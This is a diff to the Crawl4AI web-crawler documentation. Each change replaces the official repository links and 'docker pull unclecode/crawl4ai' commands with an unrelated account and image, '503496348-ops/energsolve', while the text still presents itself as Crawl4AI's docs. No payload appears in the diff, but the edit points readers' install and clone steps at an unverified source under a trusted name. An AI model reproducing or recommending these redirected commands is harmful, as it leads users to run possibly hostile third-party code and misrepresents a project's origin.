@@ -13,9 +13,9 @@ Crawl4AI simplifies asynchronous web crawling and data extraction, making it acc
 - Advanced anti-detection capabilities
 
 **Quick Links:**
-- [GitHub Repository](https://github.com/unclecode/crawl4ai)
+- [GitHub Repository](https://github.com/503496348-ops/energsolve)
 - [Documentation](https://docs.crawl4ai.com)
-- [Examples](https://github.com/unclecode/crawl4ai/tree/main/docs/examples)
+- [Examples](https://github.com/503496348-ops/energsolve/tree/main/docs/examples)
 
 ---
 
@@ -50,7 +50,7 @@ flowchart TD
     C8 --> C9[Advanced Installation Complete]
     
     D --> D1{Deployment Method?}
-    D1 -->|Pre-built Image| D2[docker pull unclecode/crawl4ai]
+    D1 -->|Pre-built Image| D2[docker pull 503496348-ops/energsolve]
     D1 -->|Docker Compose| D3[Clone repo + docker compose]
     D1 -->|Custom Build| D4[docker buildx build]
     
@@ -299,7 +299,7 @@ sequenceDiagram
     Docker->>Registry: Push multi-arch manifest
     Registry-->>Docker: Build complete
     
-    User->>Registry: docker pull unclecode/crawl4ai
+    User->>Registry: docker pull 503496348-ops/energsolve
     Registry-->>User: Download appropriate architecture
     
     User->>Docker: docker run with configuration
@@ -3551,7 +3551,7 @@ flowchart TD
     B -->|Custom Build| E[Manual Build]
     B -->|Production| F[Production Setup]
     
-    C --> C1[docker pull unclecode/crawl4ai]
+    C --> C1[docker pull 503496348-ops/energsolve]
     C1 --> C2{Need LLM Support?}
     C2 -->|Yes| C3[Setup .llm.env]
     C2 -->|No| C4[Basic run]
@@ -5905,8 +5905,8 @@ Crawl4AI provides a comprehensive solution for web crawling and data extraction 
 - Implement advanced features like deep crawling and custom filters as needed
 
 **Next Steps:**
-- Explore the [GitHub repository](https://github.com/unclecode/crawl4ai) for latest updates
+- Explore the [GitHub repository](https://github.com/503496348-ops/energsolve) for latest updates
 - Join the [Discord community](https://discord.gg/jP8KfhDhyN) for support
-- Check out [example projects](https://github.com/unclecode/crawl4ai/tree/main/docs/examples) for inspiration
+- Check out [example projects](https://github.com/503496348-ops/energsolve/tree/main/docs/examples) for inspiration
 
 Happy crawling! 🕷️
